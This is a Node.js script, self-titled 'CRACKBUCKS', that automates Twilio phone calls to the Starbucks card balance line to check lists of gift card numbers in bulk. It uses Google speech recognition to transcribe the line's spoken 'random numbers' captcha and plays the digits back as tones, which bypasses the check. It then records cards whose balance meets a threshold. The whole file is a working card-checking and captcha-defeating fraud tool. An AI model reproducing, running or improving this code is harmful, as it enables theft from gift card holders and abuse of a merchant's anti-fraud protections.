const localtunnel = require('localtunnel') // ngrok alternative
const config = require('./config.json'); // twilio auth key
const fs = require("fs"); // filesystem
var twilio = require('twilio'); // twilio API
var vClient = new twilio(config.sid, config.token); // twilio caller
const WebSocket = require("ws"); // used for realtime comms
const express = require("express"); // routing
const app = express();
const server = require("http").createServer(app);
const wss = new WebSocket.Server({ server });
const speech = require("@google-cloud/speech");
const { fstat } = require('fs');
//Configure Transcription Request
const request = {
    config: {
        encoding: "MULAW",
        sampleRateHertz: 8000,
        languageCode: "en-US",
        useEnhanced: true,
        model: "phone_call",
        speechContexts: [{
            phrases: ['for security purposes', 'for security', 'for security purposes please enter these random numbers', 'please enter these random numbers',
                'random numbers', "the current balance on your Starbuck's card is", "the current balance on your Starbucks card is", "the current balance", "$MONEY", "card is $MONEY", "Starbucks", "Starbuck's", "dollars",
                "u.s.", "cents", "dollars u.s.", "cents u.s.", "the current balance on your Starbuck's card is $MONEY", "the current balance on your Starbucks card is $MONEY", "u.s",
                "4 dollars", "$4", "$4 and", "4 dollars and", "four dollars", "four dollars and"]
        }]
    },
    interimResults: true
};

var toCheck = fs.readFileSync('./combo.txt').toString().split('\n');

jugaad = null // loophole, in this case the loophole is sending empty packets so that Google Cloud doesn't think we didn't say anything.
// I don't even think it works but it might, I'll check again later. 

url = null // localtunnel URL
pUrl = null
wUrl = null

sid = null
currentGift = null
importGift = null

const process = require('process');

googleOptions = {
    keyFilename: "./google.json"
} // so google cloud knows what to do 

const client = new speech.SpeechClient(googleOptions);

app.get("/", (req, res) => res.send("CRACKBUCKS"));

app.post("/", (req, res) => {
    res.set("Content-Type", "text/xml");

    res.send(`
      <Response>
        <Start>
          <Stream url="${wUrl}"/>
        </Start>
        <Say>I will stream the next 60 seconds of audio through your websocket</Say>
        <Pause length="60" />
      </Response>
    `);
});

wss.on("connection", function connection(ws) {
    debug("New Connection Initiated");

    ws.on("message", function incoming(message) {
        const msg = JSON.parse(message);
        switch (msg.event) {
            case "connected":
                debug(`A new call has connected.`);
                jugaad = setInterval(function () {
                    recognizeStream.write("");
                }, 6000)
                // Create Stream to the Google Speech to Text API
                recognizeStream = client
                    .streamingRecognize(request)
                    .on("error", console.error)
                    .on("data", data => {
                        debug(data.results[0].alternatives[0].transcript)
                        if (data.results[0].alternatives[0].transcript.includes('random') && (data.results[0].alternatives[0].transcript.match(/\d/g) || []).length > 2) {
                            num = data.results[0].alternatives[0].transcript.replace(/\D/g, "");
                            trueNum = chunk(num, 1).join('ww') // we're gonna add another second since the call is ending so quick now?
                            trueNum = "ww" + trueNum
                            debug(`We think the captcha is here, so we're gonna send ${num} over, but in the form of ${trueNum}.`)
                            vClient.calls(sid).update({
                                twiml: `<Response>
                                <Play digits="${trueNum}"></Play>
                                <Start>
                                  <Stream url="${wUrl}"/>
                                </Start>
                                <Pause length="60" />
                              </Response>`
                            })
                        } // adding US to see if balance is complete, hopefully works?
                        if (data.results[0].alternatives[0].transcript.includes('card is') && (data.results[0].alternatives[0].transcript.match(/\d/g) || []).length > 0) {
                            if (data.results[0].alternatives[0].transcript.includes('us') || data.results[0].alternatives[0].transcript.includes('US') || data.results[0].alternatives[0].transcript.includes('Us') || data.results[0].alternatives[0].transcript.includes('U.S') || data.results[0].alternatives[0].transcript.includes('u.s.') || data.results[0].alternatives[0].transcript.includes('you ass') || data.results[0].alternatives[0].transcript.includes('you what') || data.results[0].alternatives[0].transcript.includes('to you') || data.results[0].alternatives[0].transcript.includes('wage')) {
                                //bal = data.results[0].alternatives[0].transcript.replace(/\D/g, "");
                                oldBal = data.results[0].alternatives[0].transcript
                                oldBal = oldBal.substring(oldBal.indexOf("$"))
                                oldBal = oldBal.replace(/[^\d.\\-\\$]/g, '');
                                debug(oldBal)
                                bal = oldBal
                                // if (data.results[0].alternatives[0].transcript.includes('cents') || data.results[0].alternatives[0].transcript.includes('$')) {

                                // }
                                console.log(`${bal} is the balance of the card.`)
                                //endCall("found balance")
                                if (!isNaN(config.minimum) && parseFloat(bal.substring(1)) >= config.minimum || isNaN(config.minimum)) {
                                    completedGift = currentGift
                                    writer(bal)
                                }
                                else {
                                    debug(`Throwing away card ${currentGift} with balance of $${bal}.`)
                                    pKill("Balance threshold")
                                }
                            }
                            else {
                                bal = data.results[0].alternatives[0].transcript.replace(/\D/g, "");
                                debug(`${bal} but it failed u.s. check`)
                            }
                        }
                        if (data.results[0].alternatives[0].transcript.includes('were not able to locate') || data.results[0].alternatives[0].transcript.includes("we're not able to locate")) {
                            //endCall("cant locate")
                            pKill(`Can't locate number. - ${currentGift}`)
                        }
                        if (data.results[0].alternatives[0].transcript.includes('should be 16')) {
                            pKill(`Mistyped - ${currentGift}`)
                        }
                        if (data.results[0].alternatives[0].transcript.includes('history') || data.results[0].alternatives[0].transcript.includes('quality') || data.results[0].alternatives[0].transcript.includes('representative') || data.results[0].alternatives[0].transcript.includes('transactions') || data.results[0].alternatives[0].transcript.includes('currently have') && data.results[0].alternatives[0].transcript.includes('stars')) {
                            pKill(`too long/fail captcha? - ${currentGift}`)
                        }
                        if (data.results[0].alternatives[0].transcript.includes('inactive') || data.results[0].alternatives[0].transcript.includes('activate')) {
                            pKill(`Inactive - ${currentGift}`)
                        }


                    });

                break;
            case "start":
                debug(`Starting Media Stream ${msg.streamSid}`);
                break;
            case "media":
                recognizeStream.write(msg.media.payload);
                break;
            case "stop":
                debug(`Call Has Ended`);
                clearInterval(jugaad)
                recognizeStream.destroy();

                break;
        }
    });

});

function chunk(str, n) {
    var ret = [];
    var i;
    var len;

    for (i = 0, len = str.length; i < len; i += n) {
        ret.push(str.substr(i, n))
    }

    return ret
};

function ring(giftNum) {
    currentGift = giftNum
    vClient.calls
        .create({
            to: '+18007827282', // sb number 18007827282
            from: config.number,
            twiml: `<Response>
        <Start>
          <Stream url="${wUrl}"/>
        </Start>
        <Pause length="60" />
      </Response>`,
            sendDigits: `wwwwwwwwww1ww1ww1ww1ww1ww${giftNum}`,
        })
        .then(call => {
            sid = call.sid
            debug(`Starting call with SID: ${sid}`)
            // setTimeout(function () {
            //     client.transcriptions(sid).fetch()
            //         .then(transcription => console.log(transcription.transcriptionText))
            // }, 11000)
        })
}

// function beginCheck() {
//     console.log(`Starting check on ${toCheck[0]}`)
//     clearInterval(jugaad)
//     ring(toCheck[0])
//     toCheck.shift();
// }

// function endCall(res) {
//     vClient.calls(sid).update({
//         twiml: `<Response>
//         <Hangup/>
//       </Response>`
//     }).then(() => {
//         console.log(`Call ended for reason: ${res}`)
//         clearInterval(jugaad)
//         recognizeStream.destroy();
//     })
// }

completedGift = null

function writer(bal) {
    first = `./${completedGift} - ${bal}.txt`.replace(/\r?\n|\r/g, "");
    second = `CARD NUMBER: ${completedGift} BALANCE: ${bal}`.replace(/\r?\n|\r/g, "");
    fs.writeFile(first, second, function (err) {
        if (err) {
            debug(err);
            pKill(`Error writing card balance ${completedGift} ${bal}`)
        }
        else {
            //beginCheck()
            pKill("Wrote balance.")
        }
    });
}

function pKill(message, bool = true) {
    console.log(`pKill: ${message}`)
    if (bool == false) {
        process.exit()
    }
    else {
        try { // to end the call
            vClient.calls(sid).update({
                twiml: `<Response>
                <Hangup/>
              </Response>`
            }).then(call => {
                debug('pKill: Passed hangup successfully')
                process.exit()
            })
        }
        catch { // kill the process if error
            debug('pKill: Call did not terminate successfully')
            process.exit()
        }
    }
}

// Unfortunately pretty much everything here besides the new localtunnel code is derived from the prototype since I figured there'd be no reason to literally rewrite it
// I'll try to make it less messy in the future
// Here we have to start considering what we're going to do regarding making this a throwaway process and what we need passed in
// I think we just need to pass in the card number and the port
// The main script will do all of the card number assigning I guess, I was going to do some weird solution to make it not that way but that'd probably be best

async function startTunnel(portNum) {
    server.listen(portNum);
    const tunnel = await localtunnel({ port: portNum });
    console.log(tunnel.url);
    url = tunnel.url
    pUrl = url.slice(8)
    wUrl = `wss://${pUrl}/`

    ring(importGift)

    tunnel.on('close', () => {
        pKill("Tunnel closed.", false)
    });

}

function isDebug() {
    try {
        require("./secretHacker.txt")
        debugMode = true
        console.log("Debugging mode enabled!")
    }
    catch (err) {
        debugMode = false
    }
}

function debug(message) {
    if (debugMode == true) {
        console.log(message)
    }
}

function addStr(str, index, stringToAdd) {
    return str.substring(0, index) + stringToAdd + str.substring(index, str.length);
}

function main() {
    isDebug()
    var args = process.argv.slice(2);
    if (args == null || args == undefined || args.length != 2 || args[1].length != 16) {
        pKill("Improper arguments!", false)
    }
    else {
        importGift = args[1]
        tPort = args[0]
        startTunnel(tPort)
    }
}

main()